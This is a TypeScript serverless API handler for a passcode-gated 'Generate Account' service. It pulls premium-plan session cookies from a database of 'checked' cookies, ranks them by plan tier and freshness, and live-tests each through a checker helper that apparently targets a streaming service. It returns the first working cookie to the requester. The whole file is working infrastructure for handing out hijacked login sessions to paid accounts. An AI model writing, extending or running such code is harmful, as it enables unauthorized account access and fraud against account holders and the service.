import type { VercelRequest, VercelResponse } from "@vercel/node";
import { ipRateLimit } from "../lib/rateLimit.js";
import { isLockedOut, recordFailure, clearFailures } from "../lib/antiBruteforce.js";
import { createClient } from "@supabase/supabase-js";
import { createRequire } from "module";

function getClientIp(req: VercelRequest) {
  const xff = req.headers["x-forwarded-for"];
  if (typeof xff === "string" && xff.length > 0) {
    return xff.split(",")[0].trim();
  }

  const realIp = req.headers["x-real-ip"];
  if (typeof realIp === "string" && realIp.length > 0) {
    return realIp;
  }

  return "unknown";
}

const GENERATE_ACCOUNT_DAILY_LIMIT = 3;
const PREMIUM_POOL_FETCH_LIMIT = 200;

function getTodayDate() {
  return new Date().toISOString().slice(0, 10);
}

const supabase = createClient(
  process.env.SUPABASE_URL!,
  process.env.SUPABASE_SERVICE_ROLE_KEY!,
  {
    auth: {
      persistSession: false,
      autoRefreshToken: false,
    },
  }
);

const require = createRequire(import.meta.url);
const originalServerHelpers = require("./original_server_helpers.cjs");

const { getCookieHeaders, runDirectCheck } =
  originalServerHelpers.default ?? originalServerHelpers;

async function isPasscodeValid(passcode: string) {
  const { data, error } = await supabase
    .from("passcodes")
    .select("id, code, is_active, is_admin, expires_at, uses, max_uses")
    .eq("code", passcode)
    .eq("is_active", true)
    .maybeSingle();

  if (error) throw new Error(error.message);
  if (!data) return { ok: false, error: "Incorrect passcode." };

  if (data.expires_at && new Date(data.expires_at) <= new Date()) {
    return { ok: false, error: "This passcode has expired." };
  }

  if (
    typeof data.max_uses === "number" &&
    typeof data.uses === "number" &&
    data.uses >= data.max_uses
  ) {
    return { ok: false, error: "Usage limit reached." };
  }

  return { ok: true, passcodeRow: data };
}

async function incrementPasscodeUsage(passcodeId: string, currentUses: number | null) {
  const { error } = await supabase
    .from("passcodes")
    .update({ uses: (currentUses ?? 0) + 1 })
    .eq("id", passcodeId);

  if (error) {
    console.error("incrementPasscodeUsage error:", error.message);
  }
}

async function getDailyGenerateUsage(ip: string) {
  const today = getTodayDate();

  const { data, error } = await supabase
    .from("generate_usage")
    .select("count")
    .eq("ip", ip)
    .eq("date", today)
    .maybeSingle();

  if (error) throw new Error(error.message);
  return data?.count ?? 0;
}

async function incrementDailyGenerateUsage(ip: string) {
  const today = getTodayDate();
  const current = await getDailyGenerateUsage(ip);

  if (current === 0) {
    const { error } = await supabase.from("generate_usage").insert({
      ip,
      date: today,
      count: 1,
    });

    if (error) throw new Error(error.message);
    return 1;
  }

  const { error } = await supabase
    .from("generate_usage")
    .update({ count: current + 1 })
    .eq("ip", ip)
    .eq("date", today);

  if (error) throw new Error(error.message);
  return current + 1;
}

async function savePassedCheckAudits(results: any[]) {
  const passed = (results || []).filter((r) => r?.valid);
  if (!passed.length) return;

  const rows = passed.map((item) => ({
    plan: item.plan || null,
    country: item.countryOfSignup || null,
    checked_at: new Date().toISOString(),
  }));

  const { error } = await supabase.from("live_checks").insert(rows);

  if (error) {
    console.error("savePassedCheckAudits error:", error.message);
  }
}

function shuffleArray<T>(items: T[]) {
  const copy = [...items];
  for (let i = copy.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [copy[i], copy[j]] = [copy[j], copy[i]];
  }
  return copy;
}

function scorePremiumCookie(row: any) {
  let score = 0;

  const plan = String(row?.plan || "").toLowerCase();
  if (plan.includes("premium")) score += 6;
  if (plan.includes("ultra")) score += 7;
  if (plan.includes("standard")) score += 3;

  if (row?.checked_at) {
    const checkedAt = new Date(row.checked_at).getTime();
    if (!Number.isNaN(checkedAt)) {
      const ageMs = Date.now() - checkedAt;
      const ageDays = ageMs / (1000 * 60 * 60 * 24);

      if (ageDays <= 1) score += 6;
      else if (ageDays <= 3) score += 5;
      else if (ageDays <= 7) score += 4;
      else if (ageDays <= 14) score += 2;
      else score += 1;
    }
  }

  if (row?.expires_at) {
    const expiresAt = new Date(row.expires_at).getTime();
    if (!Number.isNaN(expiresAt)) {
      const diffDays = (expiresAt - Date.now()) / (1000 * 60 * 60 * 24);

      if (diffDays > 30) score += 6;
      else if (diffDays > 14) score += 5;
      else if (diffDays > 7) score += 4;
      else if (diffDays > 2) score += 2;
      else if (diffDays > 0) score += 1;
      else score -= 5;
    }
  }

  return score;
}

async function getPremiumCookiePool() {
  const { data, error } = await supabase
    .from("checked_cookies")
    .select("cookie_header, plan, checked_at, expires_at, is_live, status")
    .ilike("plan", "%premium%")
    .eq("is_live", true)
    .eq("status", "valid")
    .not("cookie_header", "is", null)
    .order("checked_at", { ascending: false })
    .limit(PREMIUM_POOL_FETCH_LIMIT);

  if (error) throw new Error(error.message);

  const rows = (data ?? []).filter((row: any) => !!row?.cookie_header);

  if (!rows.length) {
    return [];
  }

  const strongRows = rows
    .map((row: any) => ({
      ...row,
      __score: scorePremiumCookie(row),
    }))
    .sort((a: any, b: any) => b.__score - a.__score);

  const topStrong = strongRows.slice(0, 60);
  const rest = strongRows.slice(60);

  return [...shuffleArray(topStrong), ...shuffleArray(rest)];
}

export default async function handler(req: VercelRequest, res: VercelResponse) {
  try {
    const ip = getClientIp(req);

    const { success } = await ipRateLimit.limit(ip);
    if (!success) {
      return res.status(429).json({
        success: false,
        error: "Too many requests. Try again later.",
      });
    }

    const locked = await isLockedOut(ip);
    if (locked) {
      return res.status(429).json({
        success: false,
        error: "Too many failed attempts. Try again later.",
      });
    }

    if (req.method !== "POST") {
      return res.status(405).json({
        success: false,
        error: "Method not allowed",
      });
    }

    const passcode = String(req.body?.passcode ?? "").trim();
    if (!passcode) {
      return res.status(400).json({
        success: false,
        error: "Passcode is required.",
      });
    }

    const passcodeCheck = await isPasscodeValid(passcode);
    if (!passcodeCheck.ok) {
      await recordFailure(ip);
      return res.status(401).json({
        success: false,
        error: passcodeCheck.error,
      });
    }

    await incrementPasscodeUsage(
      passcodeCheck.passcodeRow.id,
      passcodeCheck.passcodeRow.uses ?? 0
    );

    await clearFailures(ip);

    const isAdmin = passcodeCheck.passcodeRow.is_admin === true;

    if (!isAdmin) {
      const todayUsage = await getDailyGenerateUsage(ip);

      if (todayUsage >= GENERATE_ACCOUNT_DAILY_LIMIT) {
        return res.status(429).json({
          success: false,
          error: "You have reached the 3 daily limit for Generate Account. Try again tomorrow.",
        });
      }

      await incrementDailyGenerateUsage(ip);
    }

    const premiumPoolRows = await getPremiumCookiePool();

    if (!premiumPoolRows.length) {
      return res.status(400).json({
        success: false,
        error: "Premium cookie pool is empty. No premium cookies available yet.",
      });
    }

    const storedCookies = premiumPoolRows
      .map((row: any) => row.cookie_header)
      .filter(Boolean);

    if (!storedCookies.length) {
      return res.status(400).json({
        success: false,
        error: "No valid premium cookies found in checked_cookies.",
      });
    }

    const parsedInput = getCookieHeaders({
      input: storedCookies.join("\n"),
    });

    if (parsedInput?.error) {
      return res.status(400).json({
        success: false,
        error: parsedInput.error,
      });
    }

    const cookies = parsedInput.cookies;
    if (!Array.isArray(cookies) || !cookies.length) {
      return res.status(400).json({
        success: false,
        error: "No valid premium cookies found in the pool.",
      });
    }

    console.log("premium pool size:", cookies.length);
    console.log("starting premium scan");

    for (const cookie of cookies) {
      const result = await runDirectCheck([cookie], 1, {
        skipNFToken: false,
        delayMs: 0,
        randomJitter: false,
        staggerMs: 0,
        onValidCookie: async () => {},
      });

      const results = Array.isArray(result?.results) ? result.results : [];
      await savePassedCheckAudits(results);

      const valid = results.find((r: any) => r?.valid);
      if (valid) {
        console.log("valid premium cookie found");
        return res.status(200).json(result);
      }
    }

    return res.status(200).json({
      success: false,
      error: "No valid premium account found from checked premium cookies.",
    });
  } catch (error: any) {
    console.error("find-account crash:", error);
    return res.status(500).json({
      success: false,
      error: error?.message || "Unexpected server error",
    });
  }
}
